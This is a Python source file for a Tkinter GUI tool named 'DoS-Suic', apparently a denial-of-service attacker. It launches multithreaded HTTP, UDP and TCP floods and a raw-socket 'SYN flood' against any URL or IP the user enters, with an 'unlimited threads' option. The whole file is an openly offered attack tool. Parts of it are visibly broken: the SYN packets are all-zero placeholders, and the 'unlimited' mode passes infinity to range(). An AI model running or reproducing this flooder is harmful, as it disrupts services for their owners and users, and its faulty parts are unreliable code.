"""
Copyright (c) [] [Your Name or Your Organization]

This code is licensed under the Creative Commons Attribution 4.0 International License (CC BY 4.0). You are free to:

- Share — copy and redistribute the material in any medium or format
- Adapt — remix, transform, and build upon the material for any purpose, even commercially.

Under the following terms:

- Attribution — You must give appropriate credit, provide a link to the license, and indicate if changes were made. You may do so in any reasonable manner, but not in any way that suggests the licensor endorses you or your use.

- No additional restrictions — You may not apply legal terms or technological measures that legally restrict others from doing anything the license permits.

This is a human-readable summary of (and not a substitute for) the license. Read the full license text at https://creativecommons.org/licenses/by/4.0/legalcode.
"""

import tkinter as tk
from tkinter import messagebox
import requests
import threading
import time
import socket
import sys
from urllib.parse import urlparse

# Global variable to control attack execution
attack_running = True

def is_valid_ip(ip):
    """Validate if the given IP address is valid."""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def is_valid_url(url):
    """Validate if the given URL is valid."""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def sanitize_ip(ip):
    """Sanitize IP address to prevent malicious inputs."""
    if is_valid_ip(ip):
        return ip
    else:
        return None

def sanitize_url(url):
    """Sanitize URL to prevent malicious inputs."""
    if is_valid_url(url):
        return url
    else:
        return None

def send_http_request(url, packet_limit):
    """Send HTTP requests to the target URL."""
    for _ in range(packet_limit):
        if not attack_running:
            break
        try:
            response = requests.get(url)
            print(f"HTTP Request sent: {response.status_code}")
        except requests.RequestException as e:
            print(f"Error sending request: {e}")

def send_udp_packet(target_ip, target_port, packet_limit):
    """Send UDP packets to the target IP and port."""
    for _ in range(packet_limit):
        if not attack_running:
            break
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                message = b'UDP packet'
                sock.sendto(message, (target_ip, target_port))
                print(f"UDP Packet sent to {target_ip}:{target_port}")
        except socket.error as e:
            print(f"Error sending UDP packet: {e}")

def send_tcp_connection(target_ip, target_port, packet_limit):
    """Send TCP connections to the target IP and port."""
    for _ in range(packet_limit):
        if not attack_running:
            break
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((target_ip, target_port))
                print(f"TCP Connection established to {target_ip}:{target_port}")
        except socket.error as e:
            print(f"Error connecting via TCP: {e}")

def send_syn_flood(target_ip, target_port, packet_limit):
    """Send SYN flood packets to the target IP and port."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as sock:
            ip_header = b'\x00' * 20  # Placeholder IP header
            tcp_header = b'\x00' * 20  # Placeholder TCP header
            packet = ip_header + tcp_header
            count = 0
            while attack_running and count < packet_limit:
                sock.sendto(packet, (target_ip, target_port))
                print(f"SYN packet sent to {target_ip}:{target_port}")
                count += 1
                time.sleep(0.1)  # Adjust sleep time as needed
    except socket.error as e:
        print(f"Error sending SYN flood packets: {e}")

def attack_target_http(url, thread_count, packet_limit):
    """Start HTTP attack on the target URL with specified threads and packet limit."""
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_http_request, args=(url, packet_limit))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

def attack_target_udp(target_ip, target_port, thread_count, packet_limit):
    """Start UDP attack on the target IP and port with specified threads and packet limit."""
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_udp_packet, args=(target_ip, target_port, packet_limit))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

def attack_target_tcp(target_ip, target_port, thread_count, packet_limit):
    """Start TCP attack on the target IP and port with specified threads and packet limit."""
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_tcp_connection, args=(target_ip, target_port, packet_limit))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

def attack_target_syn(target_ip, target_port, packet_limit):
    """Start SYN flood attack on the target IP and port with specified packet limit."""
    while attack_running:
        send_syn_flood(target_ip, target_port, packet_limit)
        time.sleep(1)

def start_attack():
    """Start the attack based on user inputs from the GUI."""
    global attack_running
    attack_running = True
    attack_type = attack_type_var.get()
    target_url = url_entry.get().strip()
    target_ip = ip_entry.get().strip()
    
    # Validate and sanitize URL and IP address
    sanitized_url = sanitize_url(target_url)
    sanitized_ip = sanitize_ip(target_ip)
    
    if target_url and not sanitized_url:
        messagebox.showerror("Error", "Invalid URL provided.")
        return
    
    if target_ip and not sanitized_ip:
        messagebox.showerror("Error", "Invalid IP address provided.")
        return
    
    # Validate number of threads input
    threads_str = threads_entry.get().strip()
    if threads_str.lower() == "unlimited":
        number_of_threads = float('inf')  # Special value for unlimited threads
    elif threads_str.isdigit():
        number_of_threads = int(threads_str)
    else:
        messagebox.showerror("Error", "Number of Threads must be a valid integer or 'unlimited'.")
        return
    
    # Validate packet limit
    packet_limit_str = packet_limit_entry.get().strip()
    if not packet_limit_str.isdigit():
        messagebox.showerror("Error", "Packet Limit must be a valid integer.")
        return
    
    packet_limit = int(packet_limit_str)
    
    if not (sanitized_url or sanitized_ip):
        messagebox.showerror("Error", "You must provide either a target URL or IP address.")
        return

    def run_attack():
        if attack_type == "HTTP" and sanitized_url:
            print(f'Starting HTTP attack on {sanitized_url} with {number_of_threads} threads and packet limit {packet_limit}')
            while attack_running:
                attack_target_http(sanitized_url, number_of_threads, packet_limit)
                time.sleep(1)
        
        if attack_type == "UDP" and sanitized_ip:
            print(f'Starting UDP attack on {sanitized_ip} with {number_of_threads} threads and packet limit {packet_limit}')
            while attack_running:
                attack_target_udp(sanitized_ip, 80, number_of_threads, packet_limit)  # Default port 80 for UDP
                time.sleep(1)

        if attack_type == "TCP" and sanitized_ip:
            print(f'Starting TCP attack on {sanitized_ip} with {number_of_threads} threads and packet limit {packet_limit}')
            while attack_running:
                attack_target_tcp(sanitized_ip, 80, number_of_threads, packet_limit)  # Default port 80 for TCP
                time.sleep(1)
        
        if attack_type == "SYN" and sanitized_ip:
            print(f'Starting SYN flood attack on {sanitized_ip} with port 80 and packet limit {packet_limit}')
            attack_target_syn(sanitized_ip, 80, packet_limit)

    # Run the attack in a separate thread
    attack_thread = threading.Thread(target=run_attack)
    attack_thread.start()

def start_unlimited_attack():
    """Start the attack with unlimited threads based on user inputs from the GUI."""
    global attack_running
    attack_running = True
    attack_type = attack_type_var.get()
    target_url = url_entry.get().strip()
    target_ip = ip_entry.get().strip()
    
    # Validate and sanitize URL and IP address
    sanitized_url = sanitize_url(target_url)
    sanitized_ip = sanitize_ip(target_ip)
    
    if target_url and not sanitized_url:
        messagebox.showerror("Error", "Invalid URL provided.")
        return
    
    if target_ip and not sanitized_ip:
        messagebox.showerror("Error", "Invalid IP address provided.")
        return
    
    # Validate packet limit
    packet_limit_str = packet_limit_entry.get().strip()
    if not packet_limit_str.isdigit():
        messagebox.showerror("Error", "Packet Limit must be a valid integer.")
        return
    
    packet_limit = int(packet_limit_str)
    
    if not (sanitized_url or sanitized_ip):
        messagebox.showerror("Error", "You must provide either a target URL or IP address.")
        return

    def run_unlimited_attack():
        if attack_type == "HTTP" and sanitized_url:
            print(f'Starting HTTP attack on {sanitized_url} with unlimited threads and packet limit {packet_limit}')
            while attack_running:
                attack_target_http(sanitized_url, float('inf'), packet_limit)
                time.sleep(1)
        
        if attack_type == "UDP" and sanitized_ip:
            print(f'Starting UDP attack on {sanitized_ip} with unlimited threads and packet limit {packet_limit}')
            while attack_running:
                attack_target_udp(sanitized_ip, 80, float('inf'), packet_limit)  # Default port 80 for UDP
                time.sleep(1)

        if attack_type == "TCP" and sanitized_ip:
            print(f'Starting TCP attack on {sanitized_ip} with unlimited threads and packet limit {packet_limit}')
            while attack_running:
                attack_target_tcp(sanitized_ip, 80, float('inf'), packet_limit)  # Default port 80 for TCP
                time.sleep(1)
        
        if attack_type == "SYN" and sanitized_ip:
            print(f'Starting SYN flood attack on {sanitized_ip} with port 80 and packet limit {packet_limit}')
            attack_target_syn(sanitized_ip, 80, packet_limit)

    # Run the unlimited attack in a separate thread
    unlimited_attack_thread = threading.Thread(target=run_unlimited_attack)
    unlimited_attack_thread.start()

def stop_attack():
    """Stop the ongoing attack."""
    global attack_running
    attack_running = False
    print('Stopping attack...')

def display_banner():
    """Display the banner text."""
    banner =  "██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗\n"
    banner += "██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║███████╗█████╗███████║   ██║      ██║   ███████║██║     █████╔╝\n"
    banner += "██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗\n"
    banner += "██████╔╝██████╔╝╚██████╔╝███████║      ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗\n"
    banner += "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\n\n"
    banner += "                       DoS-Suic\n"
    banner += "                   by Shikan-c\n"
    return banner

def create_gui():
    """Create the GUI for the DoS-Suic tool."""
    window = tk.Tk()
    window.title("DoS-Suic by Shikan-c")
    window.geometry("800x700")
    window.configure(bg="#2E2E2E")

    # Banner with "DoS-Suic" and "by Shikan-c"
    banner_frame = tk.Frame(window, bg="#2E2E2E")
    banner_frame.pack(fill=tk.X, pady=10)

    banner_text = tk.Label(banner_frame, text=display_banner(), font=("Courier", 10), bg="#2E2E2E", fg="#FFFFFF", justify=tk.LEFT, anchor='w')
    banner_text.pack(pady=10, padx=10, anchor='w')

    title_label = tk.Label(window, text="DoS-Suic Attack Tool", font=("Helvetica", 22, "bold"), bg="#2E2E2E", fg="#FFFFFF")
    title_label.pack(pady=10)

    tk.Label(window, text="Target Domain (optional):", bg="#2E2E2E", fg="#FFFFFF").pack(pady=5)
    global url_entry
    url_entry = tk.Entry(window, width=70)
    url_entry.pack(pady=5)

    tk.Label(window, text="Target IP Address (optional):", bg="#2E2E2E", fg="#FFFFFF").pack(pady=5)
    global ip_entry
    ip_entry = tk.Entry(window, width=70)
    ip_entry.pack(pady=5)

    tk.Label(window, text="Number of Threads:", bg="#2E2E2E", fg="#FFFFFF").pack(pady=5)
    global threads_entry
    threads_entry = tk.Entry(window, width=70)
    threads_entry.pack(pady=5)

    tk.Label(window, text="Packet Limit:", bg="#2E2E2E", fg="#FFFFFF").pack(pady=5)
    global packet_limit_entry
    packet_limit_entry = tk.Entry(window, width=70)
    packet_limit_entry.pack(pady=5)

    tk.Label(window, text="Attack Type:", bg="#2E2E2E", fg="#FFFFFF").pack(pady=5)
    global attack_type_var
    attack_type_var = tk.StringVar(value="Choose Attack Type")
    attack_type_menu = tk.OptionMenu(window, attack_type_var, "Choose Attack Type", "HTTP", "UDP", "TCP", "SYN")
    attack_type_menu.config(bg="#4CAF50", fg="#FFFFFF", font=("Helvetica", 14))
    attack_type_menu.pack(pady=10)

    start_button = tk.Button(window, text="Start Attack", command=start_attack, bg="#4CAF50", fg="#FFFFFF", font=("Helvetica", 16))
    start_button.pack(pady=10)

    unlimited_button = tk.Button(window, text="Run Unlimited Threads", command=start_unlimited_attack, bg="#FFC107", fg="#FFFFFF", font=("Helvetica", 16))
    unlimited_button.pack(pady=10)

    stop_button = tk.Button(window, text="Stop Attack", command=stop_attack, bg="#F44336", fg="#FFFFFF", font=("Helvetica", 16))
    stop_button.pack(pady=10)

    def on_attack_type_change(*args):
        if attack_type_var.get() == "Choose Attack Type":
            packet_limit_entry.pack(pady=5)
        else:
            packet_limit_entry.pack_forget()

    attack_type_var.trace("w", on_attack_type_change)

    window.mainloop()

if __name__ == "__main__":
    create_gui()
